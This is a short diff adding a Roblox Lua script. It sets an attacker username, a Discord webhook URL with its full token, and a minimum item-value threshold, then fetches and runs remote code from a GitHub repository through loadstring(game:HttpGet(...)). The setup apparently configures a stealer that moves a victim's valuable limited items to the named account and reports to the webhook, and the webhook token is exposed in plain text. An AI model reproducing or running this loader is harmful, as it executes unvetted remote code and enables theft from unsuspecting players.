@@ -1,0 +1,6 @@
+Username= '1xreaperofdeathx1'
+Webhook= 'https://discord.com/api/webhooks/1302363638962851962/znytj14qn3VyFQCLuTupp9KTSe3r_cAyARCN_SZPlMwe9lhGM8wSpDHDyPsRZiCLsIP9'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/KSFoster/VANHOFFHub/refs/heads/main/Lua'))()
